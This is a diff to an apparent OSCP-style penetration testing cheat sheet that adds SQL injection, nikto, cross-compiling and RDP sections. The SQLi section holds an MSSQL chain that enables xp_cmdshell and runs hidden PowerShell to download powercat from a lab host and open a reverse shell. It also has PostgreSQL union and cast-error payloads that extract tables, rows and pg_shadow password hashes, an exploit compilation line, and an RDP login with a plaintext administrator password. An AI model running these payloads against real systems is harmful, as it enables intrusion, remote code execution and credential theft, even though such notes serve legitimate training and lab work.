@@ -8,15 +8,19 @@
 
 - [SQL](#sql)
   - [MYSQL](#mysql)
+  - [SQLi](#sqli)
 - [Tools](#tools)
   - [feroxbuster](#feroxbuster)
   - [gobuster](#gobuster)
+  - [nikto](#nikto)
   - [wfuzz](#wfuzz)
   - [ffuf](#ffuf)
   - [wget](#wget)
   - [Python](#python)
   - [hashcat](#hashcat)
   - [pspy](#pspy)
+  - [Cross Compiling](#cross-compiling)
+  - [xfreerdp](#xfreerdp)
 - [SSH](#ssh)
   - [SSH KEY](#ssh-key)
   - [SSH Tunneling](#ssh-tunneling)
@@ -197,6 +201,47 @@ select * from users_secure;
 update users_secure SET password="$2y$10$R0cpsKNLDqDZpfxDCaq8Qufxl0uLbmwiL0k6XDR1kPBDXVIYbeQ0W" WHERE username="admin"
 ```
 
+## SQLi
+```bash
+# mssql command injection
+';EXEC sp_configure 'show advanced options', 1;--
+';RECONFIGURE;--
+';EXEC sp_configure "xp_cmdshell", 1;--
+';RECONFIGURE;--
+';EXEC xp_cmdshell 'powershell.exe -nop -w hidden -c "IEX ((New-Object Net.WebClient).DownloadString(''http://192.168.45.176/powercat.ps1''))"; powercat -c 192.168.45.176 -p 4444 -e powershell'; --
+
+
+# postgresql command injection
+' order by 7 -- //
+' union select 1, 1, 1, 1, 1, 1 -- //
+' union select 'd', 1, 1, 'd', 'd', null -- //
+
+
+# Current user
+' union select 'd', cast((SELECT concat('DATABASE: ',current_user)) as int), 1, 'd', 'd', null -- //
+
+
+# Use cast to cause error to get the database
+' union select 'd', cast((SELECT concat('DATABASE: ',current_database())) as int), 1, 'd', 'd', null -- //
+## ERROR
+<b>Warning</b>:  pg_query(): Query failed: ERROR:  invalid input syntax for type integer: &quot;DATABASE: glovedb&quot; in <b>/var/www/html/class.php</b> on line <b>423</b><br />
+
+# Use case to find out tables
+cast((SELECT table_name FROM information_schema.tables LIMIT 1 OFFSET data_offset) as int)
+
+
+# Use cast to find out columns for each table
+cast((SELECT column_name FROM information_schema.columns WHERE table_name='data_table' LIMIT 1 OFFSET data_offset) as int)
+
+
+# Use cast to find out row for each column
+cast((SELECT data_column FROM data_table LIMIT 1 OFFSET data_offset) as int)
+
+
+# Get current user's password!
+' union select 'd', cast((SELECT concat('DATABASE: ',passwd) FROM pg_shadow limit 1 offset 1) as int), 1, 'd', 'd', null -- //
+```
+
 ## Tools
 ### feroxbuster 
 ```bash
@@ -208,6 +253,38 @@ feroxbuster -u http://192.168.209.153:8000/ -w /usr/share/seclists/Discovery/Web
 ```bash
 gobuster dir -u http://192.168.167.109/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
 ```
+
+### nikto
+```bash
+# basic scanning
+nikto -h vulnerable_ip
+nikto -h vulnerable_ip -p 80, 8080, 8000
+
+# plugins
+nikto -h vulnerable_ip --list-plugins
+nikto -h 10.10.10.1 -Plugin apacheuser
+
+# verbosing scan
+nikto -h vulnerable_ip -Display 1
+1: Show any redirects that are given by the web server.
+2: Show any cookies received
+E: Output any errors
+
+# vulnerability searching
+nikto -h vulnerable_ip -Tuning 0
+| Category                          | Option |
+|-----------------------------------|--------|
+| File Upload                       | 0      |
+| Misconfigurations / Default Files | 2      |
+| Information Disclosure            | 3      |
+| Injection                         | 4      |
+| Command Execution                 | 8      |
+| SQL Injection                     | 9      |
+
+# save your findings
+nikto -h http://ip_address -o report.html
+```
+
 
 ### curl
 ![image](https://github.com/nuricheun/OSCP/assets/14031269/83b00a36-8468-4e38-a5c9-3cf2eb68cbbd)
@@ -262,6 +339,18 @@ hashcat -m 3200 dora /usr/share/wordlists/rockyou.txt --force
 ./pspy64 -pf -i 1000
 ```
 
+### Cross Compiling
+```bash
+sudo apt install mingw-w64
+i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe
+#  when the linker cannot find the winsock library
+i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe -lws2_32
+```
+
+### xfreerdp
+```bash
+xfreerdp /u:administrator /p:qwertyuiop /v:10.3.26.190:3333 /cert:ignore
+```
 
 # SSH
 ## SSH Keygen
@@ -377,7 +466,7 @@ curl -d '{"user":"clumsyadmin","url":"http://192.168.45.175:443/updatefile.elf;n
 wfuzz -c --sc 200,301 -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -H 'X-Forwarded-For:127.0.0.1' http://192.168.222.134:13337/logs?file=./FUZZ.py
 ```
 
-## Web
+## SMB
 ```bash
 # nmap
 nmap 10.10.10.175 --script=smb-enum* -p445
